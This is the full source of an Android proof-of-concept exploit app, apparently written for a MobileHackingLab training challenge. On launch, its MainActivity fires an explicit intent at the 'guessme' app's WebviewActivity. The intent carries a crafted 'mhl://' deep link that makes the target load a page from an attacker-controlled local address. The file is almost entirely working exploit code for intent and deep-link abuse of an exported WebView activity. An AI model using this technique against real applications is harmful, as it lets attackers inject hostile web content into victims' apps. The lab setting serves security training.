package com.exploit;

import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        launchWebviewActivity();
    }

    private void launchWebviewActivity() {
        Intent intent = new Intent(Intent.ACTION_VIEW);
        intent.setComponent(new ComponentName("com.mobilehackinglab.guessme", "com.mobilehackinglab.guessme.WebviewActivity"));
        intent.setData(Uri.parse("mhl://mobilehackinglab?url=http://192.168.8.206/mobilehackinglab.com"));
        startActivity(intent);
        
    }
}
